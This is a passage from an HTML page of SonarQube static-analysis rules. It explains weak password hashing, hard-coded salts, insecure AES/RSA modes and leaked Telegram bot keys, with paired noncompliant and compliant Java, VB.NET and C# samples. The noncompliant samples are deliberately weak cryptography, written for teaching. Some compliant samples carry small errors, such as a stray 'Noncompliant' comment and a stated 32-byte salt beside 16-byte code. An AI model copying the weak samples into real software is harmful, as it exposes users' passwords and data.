public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery("SELECT * FROM users WHERE username = ?")
    .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@Autowired
public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery("SELECT * FROM users WHERE username = ?")
    .passwordEncoder(new BCryptPasswordEncoder());
}
</pre>
<h3>How does this work?</h3>
<h4>Use secure password hashing algorithms</h4>
<p>In general, you should rely on an algorithm that has no known security vulnerabilities. The MD5 and SHA-1 algorithms should not be used.</p>
<p>Some algorithms, such as the SHA family functions, are considered strong for some use cases, but are too fast in computation and therefore
vulnerable to brute force attacks, especially with bruteforce-attack-oriented hardware.</p>
<p>To protect passwords, it is therefore important to choose modern, slow password-hashing algorithms. The following algorithms are, in order of
strength, the most secure password hashing algorithms to date:</p>
<ol>
  <li> Argon2 </li>
  <li> scrypt </li>
  <li> bcrypt </li>
  <li> PBKDF2 </li>
</ol>
<p>Argon2 should be the best choice, and others should be used when the previous one is not available. For systems that must use FIPS-140-certified
algorithms, PBKDF2 should be used.</p>
<p>Whenever possible, choose the strongest algorithm available. If the algorithm currently used by your system should be upgraded, OWASP documents
possible upgrade methods here: <a
href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#upgrading-legacy-hashes">Upgrading Legacy Hashes</a>.</p>
<p>In the previous example, the <code>BCryptPasswordEncoder</code> is a password hashing function in Java that is designed to be secure and resistant
to various types of attacks, including brute-force and rainbow table attacks. It is slow, adaptative, and automatically implements a salt.</p>
<h4>Never store passwords in plaintext</h4>
<p>A user password should never be stored in plaintext. Instead, a hash should be produced from it using a secure algorithm. When dealing with
password storage security, best practices recommend relying on a slow hashing algorithm, that will make brute force attacks more difficult. Using a
hashing function with adaptable computation and memory complexity also is recommended to be able to increase the security level with time.</p>
<p>Adding a salt to the digest computation is also recommended to prevent pre-computed table attacks (see rule <a href='/organizations/sopra-steria/rules?open=java%3AS2053&rule_key=java%3AS2053'>S2053</a>).</p>
<h3>Pitfalls</h3>
<h4>Pre-hashing passwords</h4>
<p>As bcrypt has a maximum length input length of 72 bytes for most implementations, some developers may be tempted to pre-hash the password with a
stronger algorithm before hashing it with bcrypt.</p>
<p>Pre-hashing passwords with bcrypt is not recommended as it can lead to a specific range of issues. Using a strong salt and a high number of rounds
is enough to protect the password.</p>
<p>More information about this can be found here: <a
href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords-with-bcrypt">Pre-hashing Passwords with
Bcrypt</a>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Spring Framework Security Documentation - <a
  href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/crypto/bcrypt/BCryptPasswordEncoder.html">Class
  BCryptPasswordEncoder</a> </li>
  <li> OWASP CheatSheet - <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/256">CWE-256 - Plaintext Storage of a Password</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/916">CWE-916 - Use of Password Hash With Insufficient Computational Effort</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2053">
              java:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h3>Exceptions</h3>
<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such
functions are:</p>
<ul>
  <li> Argon2 </li>
  <li> PBKDF2 </li>
  <li> Scrypt </li>
  <li> Bcrypt </li>
</ul>
<p>When they are used for password storage, using a secure, random salt is required.</p>
<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those
cases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed
salt is safe and accepted.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.spec.PBEParameterSpec;

public void hash() {
    byte[] salt = "salty".getBytes();
    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.SecureRandom;
import javax.crypto.spec.PBEParameterSpec;

public void hash() {
    SecureRandom random = new SecureRandom();
    byte[] salt = new byte[16];
    random.nextBytes(salt);

    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000);
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the
<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/759">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/760">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5542">
              vbnet:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim Algorithm As New AesManaged() With {
            .KeySize = 128,
            .BlockSize = 128,
            .Mode = CipherMode.ECB, ' Noncompliant
            .Padding = PaddingMode.PKCS7
            }
    End Sub
End Module
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim RsaCsp = New RSACryptoServiceProvider()
        RsaCsp.Encrypt(data, False) ' Noncompliant
    End Sub
End Module
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim Algorithm As New AesGcm(data)
    End Sub
End Module
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim RsaCsp = New RSACryptoServiceProvider()
        RsaCsp.Encrypt(data, True) ' Noncompliant
    End Sub
End Module
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2053">
              vbnet:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h3>Exceptions</h3>
<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such
functions are:</p>
<ul>
  <li> Argon2 </li>
  <li> PBKDF2 </li>
  <li> Scrypt </li>
  <li> Bcrypt </li>
</ul>
<p>When they are used for password storage, using a secure, random salt is required.</p>
<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those
cases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed
salt is safe and accepted.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Sub Hash(Password As String)
    Dim Salt As Byte() = Encoding.UTF8.GetBytes("salty")
    Dim Hashed As New Rfc2898DeriveBytes(Password, Salt) ' Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Sub Hash(Password As String)
    Dim Hashed As New Rfc2898DeriveBytes(Password, 64)
End Sub
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>
<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/759">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/760">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5542">
              csharpsquid:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    AesManaged aes = new AesManaged
    {
        keysize = 128,
        blocksize = 128,
        mode = ciphermode.ecb,        // Noncompliant
        padding = paddingmode.pkcs7
    };
}
</pre>
<p>Note that Microsoft has marked derived cryptographic types like <code>AesManaged</code> as no longer recommended for use.</p>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    RSACryptoServiceProvider RsaCsp = new RSACryptoServiceProvider();
    byte[] encryptedData            = RsaCsp.Encrypt(dataToEncrypt, false); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    AesGcm aes = AesGcm(key);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    RSACryptoServiceProvider RsaCsp = new RSACryptoServiceProvider();
    byte[] encryptedData            = RsaCsp.Encrypt(dataToEncrypt, true);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2053">
              csharpsquid:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h3>Exceptions</h3>
<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such
functions are:</p>
<ul>
  <li> Argon2 </li>
  <li> PBKDF2 </li>
  <li> Scrypt </li>
  <li> Bcrypt </li>
</ul>
<p>When they are used for password storage, using a secure, random salt is required.</p>
<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those
cases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed
salt is safe and accepted.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Security.Cryptography;

public static void hash(string password)
{
    var salt = Encoding.UTF8.GetBytes("salty");
    var hashed = new Rfc2898DeriveBytes(password, salt); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Security.Cryptography;

public static void hash(string password)
{
    var hashed = new Rfc2898DeriveBytes(password, 16);
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>
<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/759">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/760">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6701">
              secrets:S6701
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Telegram bot keys are used to authenticate and authorize a bot to interact with the Telegram Bot API. These keys are essentially access tokens that
allow the bot to send and receive messages, manage groups and channels, and perform other actions on behalf of the bot.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
